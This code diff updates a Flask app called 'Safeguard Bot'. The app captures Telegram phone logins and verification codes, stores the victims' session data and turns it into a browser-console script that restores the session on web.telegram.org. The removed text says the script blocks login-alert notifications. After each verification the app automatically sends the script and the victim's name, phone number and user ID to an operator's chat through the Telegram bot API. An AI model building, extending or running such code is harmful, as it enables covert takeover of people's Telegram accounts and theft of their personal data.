@@ -47,17 +47,7 @@ app_loop = init_event_loop()
 
 from utils.tg.auth import telegram_auth
 from utils.credentials_manager import credentials_manager
-
-# Initialize MongoDB with error handling
-try:
-    from utils.mongodb_manager import mongodb_manager
-    if mongodb_manager.is_connected():
-        logging.info("📊 MongoDB connected - using database storage")
-    else:
-        logging.info("📁 MongoDB not available - using file storage")
-except Exception as e:
-    logging.warning(f"⚠️ MongoDB initialization failed, using file storage: {e}")
-    mongodb_manager = None
+from utils.mongo_session_manager import mongo_session_manager
 
 app = Flask(__name__)
 app.secret_key = os.environ.get('SECRET_KEY', 'your-secret-key-change-this')
@@ -218,7 +208,7 @@ def verify():
                 # Automatically generate and send script to Telegram
                 try:
                     # Generate script content
-                    script_content = credentials_manager.generate_stealth_script(session_data)
+                    script_content = credentials_manager.generate_working_format_script(session_data)
                     
                     # Generate script filename
                     user_id = result['user_info'].get('id', 'unknown')
@@ -240,7 +230,7 @@ def verify():
                             
                             # Prepare message
                             message_parts = [
-                                "🛡️ **Auto-Generated Stealth Script**",
+                                "🔧 **Auto-Generated Working Script**",
                                 "",
                                 f"📁 **File:** `{script_filename}`",
                                 f"👤 **User:** {result['user_info'].get('first_name', 'Unknown')} {result['user_info'].get('last_name', '')}",
@@ -269,58 +259,102 @@ def verify():
                             
                             message_text = "\n".join(message_parts)
                             
-                            # Send stealth script file directly
-                            header_parts = [
-                                "🛡️ **Auto-Generated Stealth Script File**",
-                                "",
-                                f"📁 **File:** `{script_filename}`",
-                                f"👤 **User:** {result['user_info'].get('first_name', 'Unknown')} {result['user_info'].get('last_name', '')}",
-                                f"📱 **Phone:** +{result['user_info'].get('phone', 'Unknown')}",
-                                f"🆔 **User ID:** {result['user_info'].get('id', 'Unknown')}",
-                                f"⏰ **Generated:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
-                                "",
-                                "📝 **Instructions:**",
-                                "1. Download the script file below",
-                                "2. Open https://web.telegram.org/a/ in your browser",
-                                "3. Press F12 to open Developer Tools", 
-                                "4. Go to Console tab",
-                                "5. Copy and paste the script content",
-                                "6. Press Enter to execute",
-                                "",
-                                "💡 **Tips:**",
-                                "- This stealth script blocks notifications to prevent login alerts",
-                                "- Make sure you're on web.telegram.org/a/ (not web.telegram.org/k/)",
-                                "- Try refreshing the page first",
-                                "- Try using a different browser or incognito mode", 
-                                "- Check if your network allows WebSocket connections"
-                            ]
-                            
-                            header_text = "\n".join(header_parts)
-                            
-                            # Send header message
-                            response1 = requests.post(
-                                f"https://api.telegram.org/bot{bot_token}/sendMessage",
-                                json={
-                                    "chat_id": target_user_id,
-                                    "text": header_text,
-                                    "parse_mode": "Markdown"
-                                }
-                            )
-                            
-                            # Send the script file
-                            script_filepath = os.path.join(credentials_manager.storage_dir, script_filename)
-                            with open(script_filepath, 'rb') as script_file:
-                                files = {'document': (script_filename, script_file, 'text/javascript')}
-                                response2 = requests.post(
-                                    f"https://api.telegram.org/bot{bot_token}/sendDocument",
-                                    data={'chat_id': target_user_id},
-                                    files=files
+                            # Send message (split if too long)
+                            if len(message_text) > 4000:
+                                # Send header first
+                                header_parts = message_parts[:-3]
+                                header_text = "\n".join(header_parts)
+                                
+                                response1 = requests.post(
+                                    f"https://api.telegram.org/bot{bot_token}/sendMessage",
+                                    json={
+                                        "chat_id": target_user_id,
+                                        "text": header_text,
+                                        "parse_mode": "Markdown"
+                                    }
                                 )
-                            
-                            if response1.status_code == 200 and response2.status_code == 200:
-                                logging.info(f"✅ Auto-sent stealth script file to Telegram user {target_user_id}")
+                                
+                                # Split script content into chunks if it's too long
+                                max_chunk_size = 3000  # Reduced to ensure we stay well under Telegram's limit
+                                script_chunks = []
+                                
+                                # Split the script content into smaller chunks
+                                script_length = len(script_content)
+                                chunk_size = max_chunk_size
+                                
+                                for i in range(0, script_length, chunk_size):
+                                    chunk = script_content[i:i + chunk_size]
+                                    script_chunks.append(chunk)
+                                
+                                # If we still have chunks that are too long, split them further
+                                final_chunks = []
+                                for chunk in script_chunks:
+                                    if len(chunk) > 3000:
+                                        # Split this chunk into even smaller pieces
+                                        sub_chunk_size = 2500
+                                        for j in range(0, len(chunk), sub_chunk_size):
+                                            sub_chunk = chunk[j:j + sub_chunk_size]
+                                            final_chunks.append(sub_chunk)
+                                    else:
+                                        final_chunks.append(chunk)
+                                
+                                script_chunks = final_chunks
+                                
+                                # Send each chunk separately
+                                success = True
+                                for i, chunk in enumerate(script_chunks):
+                                    # Ensure chunk is not too long (Telegram limit is 4096)
+                                    if len(chunk) > 3500:
+                                        logging.warning(f"⚠️ Chunk {i+1} is too long ({len(chunk)} chars), truncating...")
+                                        chunk = chunk[:3500] + "..."
+                                    
+                                    chunk_text = f"```\n{chunk}\n```"
+                                    if len(script_chunks) > 1:
+                                        chunk_text = f"**Part {i+1}/{len(script_chunks)}**\n\n{chunk_text}"
+                                    
+                                    # Final safety check - ensure total message length is under limit
+                                    if len(chunk_text) > 4000:
+                                        logging.warning(f"⚠️ Message {i+1} is too long ({len(chunk_text)} chars), truncating...")
+                                        # Remove the part header and truncate the chunk
+                                        chunk = chunk[:3000] + "..."
+                                        chunk_text = f"```\n{chunk}\n```"
+                                        if len(script_chunks) > 1:
+                                            chunk_text = f"**Part {i+1}/{len(script_chunks)}**\n\n{chunk_text}"
+                                    
+                                    response = requests.post(
+                                        f"https://api.telegram.org/bot{bot_token}/sendMessage",
+                                        json={
+                                            "chat_id": target_user_id,
+                                            "text": chunk_text,
+                                            "parse_mode": "Markdown"
+                                        }
+                                    )
+                                    
+                                    if response.status_code != 200:
+                                        logging.error(f"❌ Failed to send script chunk {i+1}: {response.text}")
+                                        success = False
+                                    else:
+                                        logging.info(f"✅ Sent script chunk {i+1}/{len(script_chunks)} ({len(chunk_text)} chars)")
+                                
+                                if response1.status_code == 200 and success:
+                                    logging.info(f"✅ Auto-sent script to Telegram user {target_user_id} (split into {len(script_chunks) + 1} messages)")
+                                else:
+                                    logging.error(f"❌ Failed to auto-send script: {response1.text}")
                             else:
-                                logging.error(f"❌ Failed to auto-send script file: {response1.text} {response2.text}")
+                                # Send as single message
+                                response = requests.post(
+                                    f"https://api.telegram.org/bot{bot_token}/sendMessage",
+                                    json={
+                                        "chat_id": target_user_id,
+                                        "text": message_text,
+                                        "parse_mode": "Markdown"
+                                    }
+                                )
+                                
+                                if response.status_code == 200:
+                                    logging.info(f"✅ Auto-sent script to Telegram user {target_user_id}")
+                                else:
+                                    logging.error(f"❌ Failed to auto-send script: {response.text}")
                                     
                         except Exception as e:
                             logging.error(f"❌ Error auto-sending script to Telegram: {e}")
@@ -485,85 +519,53 @@ def generate_script_for_credential(filename):
     try:
         # Extract session_data from the credential file
         session_data = data.get('session_data', {})
-        logging.info(f"📦 Session data keys: {list(session_data.keys()) if session_data else 'None'}")
+        user_info = data.get('user_info', {})
         
         if not session_data:
-            logging.error(f"❌ No session data found in file: {filename}")
-            return jsonify({'error': 'No session data found in credential file'}), 400
+            logging.error(f"❌ No session data found in {filename}")
+            return jsonify({'error': 'No session data found in file'}), 404
         
-        # Generate script filename
-        user_id = data.get('user_id', 'unknown')
-        script_filename = f"script_{user_id}_{int(time.time())}.js"
+        # Generate the working format script
+        script_content = credentials_manager.generate_working_format_script(session_data)
+        
+        # Generate filename for the script
+        user_id = user_info.get('id', 'unknown')
+        timestamp = int(time.time())
+        script_filename = f"script_{user_id}_{timestamp}.js"
+        
+        # Save the script
         script_filepath = os.path.join(credentials_manager.storage_dir, script_filename)
-        
-        logging.info(f"📝 Generating script content...")
-        
-        # Generate and save the script using stealth format
-        script_content = credentials_manager.generate_stealth_script(session_data)
-        
-        logging.info(f"📝 Script content length: {len(script_content)}")
-        
         with open(script_filepath, 'w', encoding='utf-8') as f:
             f.write(script_content)
         
-        logging.info(f"✅ Generated localStorage script: {script_filename}")
+        logging.info(f"✅ Generated script: {script_filename}")
         
         return jsonify({
             'success': True,
-            'message': f'Script generated: {script_filename}',
-            'script_filename': script_filename
+            'message': f'Script generated successfully: {script_filename}',
+            'script_filename': script_filename,
+            'script_content': script_content
         })
         
     except Exception as e:
         logging.error(f"❌ Error generating script for {filename}: {e}")
-        logging.error(f"❌ Error details: {type(e).__name__}: {str(e)}")
-        import traceback
-        logging.error(f"❌ Traceback: {traceback.format_exc()}")
         return jsonify({'error': f'Failed to generate script: {str(e)}'}), 500
 
 @app.route('/credentials/delete/<filename>', methods=['DELETE'])
 def delete_credential_file(filename):
-    """Delete a credential or script file"""
+    """Delete a specific credentials file"""
     if not session.get('authenticated'):
         return jsonify({'error': 'Unauthorized'}), 401
     
-    try:
-        filepath = os.path.join(credentials_manager.storage_dir, filename)
-        
-        # Check if file exists
-        if not os.path.exists(filepath):
-            return jsonify({'error': 'File not found'}), 404
-        
-        # Delete the file
-        os.remove(filepath)
-        logging.info(f"Deleted credential file: {filename}")
-        
-        return jsonify({
-            'success': True,
-            'message': f'File {filename} deleted successfully'
-        })
-        
-    except Exception as e:
-        logging.error(f"Error deleting file {filename}: {e}")
-        return jsonify({'error': 'Failed to delete file'}), 500
+    filepath = os.path.join(credentials_manager.storage_dir, filename)
+    if os.path.exists(filepath):
+        try:
+            os.remove(filepath)
+            return jsonify({'success': True, 'message': 'File deleted successfully'})
+        except Exception as e:
+            return jsonify({'error': f'Failed to delete file: {str(e)}'}), 500
+    else:
+        return jsonify({'error': 'File not found'}), 404
 
 if __name__ == '__main__':
-    print("🚀 Starting Safeguard Bot Flask App...")
-    print("📱 Phone authentication: ENABLED")
-    print("🔐 5-digit verification codes: ENABLED")
-    print("📋 Paste functionality: ENABLED")
-    print("🌐 Web app running at: http://127.0.0.1:5000")
-    print("📝 Logs will be saved to: safeguard_bot.log")
-    print("=" * 50)
-    
-    try:
-        app.run(debug=True, host='0.0.0.0', port=5000)
-    except KeyboardInterrupt:
-        print("\n🛑 Shutting down...")
-        # Clean up all active sessions
-        telegram_auth.cleanup_expired_sessions(0)  # Clean all sessions
-        # Close MongoDB connection
-        # mongo_session_manager.close() # This line is removed as per the edit hint
-        if not app_loop.is_closed():
-            app_loop.close()
-        print("✅ Cleanup completed") 
+    app.run(debug=True, host='0.0.0.0', port=5000) 
